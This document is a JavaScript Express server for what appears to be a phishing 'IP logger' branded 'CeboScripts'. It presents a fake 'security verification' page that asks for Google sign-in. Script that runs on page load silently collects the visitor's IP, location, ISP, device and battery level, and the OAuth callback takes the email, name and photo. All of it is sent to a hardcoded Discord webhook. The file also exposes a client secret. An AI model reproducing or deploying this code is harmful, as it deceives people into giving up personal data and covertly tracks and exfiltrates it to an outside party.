const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

// ======== CREDENCIALES ========
const CLIENT_ID = '189299322354-u20tl4ks27e1npj8m1rlp7qjbplqj88l.apps.googleusercontent.com';
const CLIENT_SECRET = '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';
const REDIRECT_URI = 'https://ip-logger-nine-weld.vercel.app/callback';
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD';

// ======== RUTA PRINCIPAL ========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>CeboScripts</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { background: #000; color: #fff; font-family: Arial, sans-serif; min-height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column; padding: 20px; }
                .container { text-align: center; max-width: 500px; }
                .icon { font-size: 4em; margin-bottom: 20px; }
                h1 { color: #ff0000; font-size: 2.5em; text-shadow: 0 0 30px rgba(255,0,0,0.3); margin-bottom: 15px; }
                p { color: #888; font-size: 1.1em; margin-bottom: 30px; }
                .btn-google { display: inline-flex; align-items: center; gap: 12px; background: #4285f4; color: #fff; padding: 16px 50px; border-radius: 8px; font-size: 1.2em; font-weight: bold; text-decoration: none; transition: 0.3s; }
                .btn-google:hover { background: #357ae8; transform: scale(1.05); }
                .status { margin-top: 20px; color: #666; font-size: 0.9em; }
                .footer { margin-top: 40px; color: #444; font-size: 0.8em; border-top: 1px solid #222; padding-top: 20px; width: 100%; }
                .loading { display: inline-block; width: 14px; height: 14px; border: 2px solid #333; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
                @keyframes spin { to { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="icon">🔐</div>
                <h1>VERIFICACIÓN DE SEGURIDAD</h1>
                <p>Para continuar, inicia sesión con tu cuenta de Google.</p>
                <a href="/auth/google" class="btn-google">
                    <svg width="20" height="20" viewBox="0 0 48 48">
                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                        <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z"/>
                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 24 24 48z"/>
                    </svg>
                    Iniciar sesión con Google
                </a>
                <div class="status" id="statusMsg">🔍 Haz clic en el botón</div>
                <div class="footer">CeboScripts</div>
            </div>
            <script>
                async function capturarDatos() {
                    try {
                        const status = document.getElementById('statusMsg');
                        status.innerHTML = '<span class="loading"></span> Capturando datos...';
                        const res = await fetch('https://ipapi.co/json/');
                        const data = await res.json();
                        const ua = navigator.userAgent || '';
                        let dispositivo = 'Desconocido';
                        if (/android/i.test(ua)) dispositivo = 'Android';
                        else if (/iphone|ipad|ipod/i.test(ua)) dispositivo = 'iOS';
                        else if (/windows/i.test(ua)) dispositivo = 'Windows PC';
                        else if (/mac/i.test(ua)) dispositivo = 'Mac';
                        else if (/linux/i.test(ua)) dispositivo = 'Linux';
                        let bateria = 'No disponible';
                        try {
                            if (navigator.getBattery) {
                                const battery = await navigator.getBattery();
                                bateria = Math.round(battery.level * 100) + '%';
                            }
                        } catch (e) {}
                        const info = {
                            ip: data.ip || 'No disponible',
                            ciudad: data.city || 'No disponible',
                            pais: data.country_name || 'No disponible',
                            isp: data.org || 'No disponible',
                            region: data.region || 'No disponible',
                            dispositivo: dispositivo,
                            bateria: bateria,
                            direccionReal: data.city + ', ' + data.region + ', ' + data.country_name,
                            hora: new Date().toLocaleString()
                        };
                        await fetch('/api/log-device', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(info)
                        });
                        status.innerHTML = '✅ Datos registrados';
                        status.style.color = '#00ff00';
                    } catch (error) {
                        console.error('Error:', error);
                    }
                }
                document.addEventListener('DOMContentLoaded', capturarDatos);
            </script>
        </body>
        </html>
    `);
});

// ======== RUTA: Iniciar autenticación ========
app.get('/auth/google', (req, res) => {
    const authUrl = 'https://accounts.google.com/o/oauth2/v2/auth?' +
        'client_id=' + CLIENT_ID +
        '&redirect_uri=' + REDIRECT_URI +
        '&response_type=code' +
        '&scope=email profile' +
        '&prompt=consent';
    console.log('🔄 Redirigiendo a Google');
    res.redirect(authUrl);
});

// ======== RUTA: Callback de Google ========
app.get('/callback', async (req, res) => {
    console.log('📩 Callback recibido');
    const { code } = req.query;
    if (!code) {
        return res.send('<h1>❌ Error</h1><p>No se recibió código</p><a href="/">Volver</a>');
    }
    try {
        const tokenResponse = await axios.post('https://oauth2.googleapis.com/token', {
            code,
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            redirect_uri: REDIRECT_URI,
            grant_type: 'authorization_code'
        });
        const { access_token } = tokenResponse.data;
        const userResponse = await axios.get('https://www.googleapis.com/oauth2/v2/userinfo', {
            headers: { Authorization: 'Bearer ' + access_token }
        });
        const userData = userResponse.data;
        const embed = {
            color: 0x00ff00,
            title: '✅ NUEVO USUARIO',
            fields: [
                { name: '📧 Correo', value: userData.email || 'No disponible' },
                { name: '👤 Nombre', value: userData.name || 'No disponible' },
                { name: '🖼️ Foto', value: userData.picture || 'No disponible' }
            ]
        };
        await axios.post(WEBHOOK_URL, {
            username: 'CeboScripts',
            content: '📢 **¡Nuevo usuario!**',
            embeds: [embed]
        });
        res.send(`
            <h1>✅ ¡Autenticación exitosa!</h1>
            <p>Bienvenido, ${userData.name}</p>
            <p>Correo: ${userData.email}</p>
            <a href="/">Volver</a>
        `);
    } catch (error) {
        console.error('❌ Error:', error.message);
        res.send('<h1>❌ Error</h1><p>' + error.message + '</p><a href="/">Volver</a>');
    }
});

// ======== RUTA: Recibir datos del dispositivo ========
app.post('/api/log-device', async (req, res) => {
    try {
        const data = req.body;
        const embed = {
            color: 0xff8800,
            title: '📱 DATOS DEL DISPOSITIVO',
            fields: [
                { name: '📍 Dirección', value: data.direccionReal || 'No disponible' },
                { name: '🌐 IP', value: data.ip || 'No disponible' },
                { name: '📱 Dispositivo', value: data.dispositivo || 'No disponible' },
                { name: '🔋 Batería', value: data.bateria || 'No disponible' },
                { name: '📶 ISP', value: data.isp || 'No disponible' }
            ]
        };
        await axios.post(WEBHOOK_URL, {
            username: 'CeboScripts',
            content: '📢 **Datos del dispositivo**',
            embeds: [embed]
        });
        res.json({ success: true });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: error.message });
    }
});

module.exports = app;
